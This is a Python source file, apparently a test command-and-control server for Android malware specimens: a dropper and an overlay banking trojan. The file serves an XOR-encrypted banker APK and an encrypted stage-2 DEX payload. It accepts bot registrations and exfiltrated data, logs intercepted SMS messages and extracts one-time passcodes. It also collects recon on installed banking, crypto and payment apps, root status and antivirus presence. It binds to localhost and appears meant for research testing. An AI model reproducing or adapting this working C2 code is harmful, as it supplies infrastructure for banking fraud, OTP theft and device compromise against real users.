"""
Minimal C2 server for testing dropper + overlay-banker specimens.

Dropper (port 8081):
  GET /api/v1/activate  → activation signal + payload URL
  GET /payload.apk      → XOR-encrypted overlay-banker APK

Overlay banker (port 8080):
  POST /api/v1/register → bot registration ack
  GET  /api/v1/commands → empty command queue
  POST /api/v1/exfil    → accept exfil data (log it)

Run: python test-c2-server.py
Emulator reaches host via 10.0.2.2
"""

import json
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import os
import sys

PAYLOAD_KEY = b"WiFiDropperKey!!"
BANKER_APK = os.path.join(os.path.dirname(__file__),
    "overlay-banker", "app", "build", "outputs", "apk", "debug", "app-debug.apk")

# Stage 2 payload (encrypted DEX for evasion specimen)
STAGE2_PAYLOAD = os.path.join(os.path.dirname(__file__),
    "stage-2-payload", "out", "payload.enc")


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


# ─── Dropper C2 (port 8081) ──────────────────────────────────────

class DropperHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/api/v1/activate":
            resp = {"active": True, "payload_url": "http://10.0.2.2:8081/payload.apk"}
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(resp).encode())
            print(f"[DROPPER] Activation request from {self.client_address[0]} → ACTIVATED")

        elif self.path == "/payload.apk":
            if not os.path.exists(BANKER_APK):
                print(f"[DROPPER] ERROR: Banker APK not found at {BANKER_APK}")
                self.send_response(404)
                self.end_headers()
                return

            with open(BANKER_APK, "rb") as f:
                raw = f.read()
            encrypted = xor_encrypt(raw, PAYLOAD_KEY)
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(encrypted)))
            self.end_headers()
            self.wfile.write(encrypted)
            print(f"[DROPPER] Payload delivered: {len(raw)} bytes (encrypted: {len(encrypted)})")

        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass  # Suppress default logging


# ─── Banker C2 (port 8080) ────────────────────────────────────────

class BankerHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace")

        if self.path == "/api/v1/register":
            try:
                data = json.loads(body)
                print(f"[BANKER] Bot registered: {data.get('model', '?')} / {data.get('manufacturer', '?')} / SDK {data.get('sdk', '?')}")
            except:
                print(f"[BANKER] Bot registration (raw): {body[:200]}")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')

        elif self.path == "/api/v1/sms":
            print(f"[BANKER] * SMS INTERCEPTED ({len(body)} bytes): {body[:500]}")
            try:
                data = json.loads(body)
                otp = data.get("otp", "")
                if otp:
                    print(f"[BANKER] *** OTP EXTRACTED: {otp} from sender={data.get('sender','?')}")
                else:
                    print(f"[BANKER] SMS from {data.get('sender','?')}: {data.get('body','')[:100]}")
            except:
                pass
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')

        elif self.path == "/api/v1/exfil":
            print(f"[BANKER] EXFIL received ({len(body)} bytes): {body[:300]}")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')

        elif self.path == "/api/v1/beacon":
            print(f"[STAGE-1] * BEACON received ({len(body)} bytes): {body[:300]}")
            try:
                data = json.loads(body)
                # Stage 1 beacon = short JSON {m, s, t}
                # Stage 2 recon = large JSON {device, apps, root, security, ts}
                if "device" in data:
                    # This is Stage 2 recon data from the DEX payload
                    print(f"[STAGE-2] *** RECON DATA RECEIVED ***")
                    dev = data.get("device", {})
                    print(f"[STAGE-2] Device: {dev.get('manufacturer','?')} {dev.get('model','?')} (SDK {dev.get('sdk','?')})")
                    print(f"[STAGE-2] Fingerprint: {dev.get('fingerprint','?')[:80]}")
                    apps = data.get("apps", {})
                    banking = apps.get("banking", [])
                    crypto = apps.get("crypto", [])
                    payment = apps.get("payment", [])
                    print(f"[STAGE-2] Banking apps: {banking}")
                    print(f"[STAGE-2] Crypto apps:  {crypto}")
                    print(f"[STAGE-2] Payment apps: {payment}")
                    root = data.get("root", {})
                    print(f"[STAGE-2] Root: su={root.get('su_binary',False)} magisk={root.get('magisk',False)} superuser={root.get('superuser_app',False)}")
                    sec = data.get("security", {})
                    print(f"[STAGE-2] Security: av={sec.get('av_present','?')} mdm={sec.get('mdm_present','?')}")
                    print(f"[STAGE-2] ** FULL KILL CHAIN COMPLETE: Beacon → Payload → Recon → Exfil **")
                else:
                    print(f"[STAGE-1] Device: model={data.get('m','?')} sdk={data.get('s','?')} ts={data.get('t','?')}")
                    print(f"[STAGE-1] ** EVASION SUCCESSFUL - Beacon fired past all gates **")
            except:
                print(f"[STAGE-1] Raw beacon: {body[:200]}")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')

        elif self.path == "/api/v1/ack":
            self.send_response(200)
            self.end_headers()

        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        if self.path == "/api/v1/commands":
            # Empty command queue — banker polls, gets nothing
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'[]')

        elif self.path == "/api/v1/payload":
            # Stage 2: Serve XOR-encrypted DEX payload
            if not os.path.exists(STAGE2_PAYLOAD):
                print(f"[STAGE-2] ERROR: Payload not found at {STAGE2_PAYLOAD}")
                print(f"[STAGE-2] Run: cd stage-2-payload && python scripts/build-payload.py")
                self.send_response(404)
                self.end_headers()
                return
            with open(STAGE2_PAYLOAD, "rb") as f:
                payload_bytes = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(payload_bytes)))
            self.end_headers()
            self.wfile.write(payload_bytes)
            print(f"[STAGE-2] Encrypted DEX payload served: {len(payload_bytes)} bytes")

        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass


def run_server(handler, port, name):
    # SAFETY: bind 127.0.0.1 ONLY — hardcoded, not configurable
    server = HTTPServer(("127.0.0.1", port), handler)
    print(f"[{name}] Listening on 127.0.0.1:{port}")
    server.serve_forever()


if __name__ == "__main__":
    print("=" * 60)
    print("Takopii Test C2 Server")
    print(f"Banker APK: {BANKER_APK}")
    print(f"APK exists: {os.path.exists(BANKER_APK)}")
    print("=" * 60)

    # Start both servers in threads
    t1 = threading.Thread(target=run_server, args=(BankerHandler, 8080, "BANKER-C2"), daemon=True)
    t2 = threading.Thread(target=run_server, args=(DropperHandler, 8081, "DROPPER-C2"), daemon=True)
    t1.start()
    t2.start()

    try:
        t1.join()
    except KeyboardInterrupt:
        print("\nShutting down.")
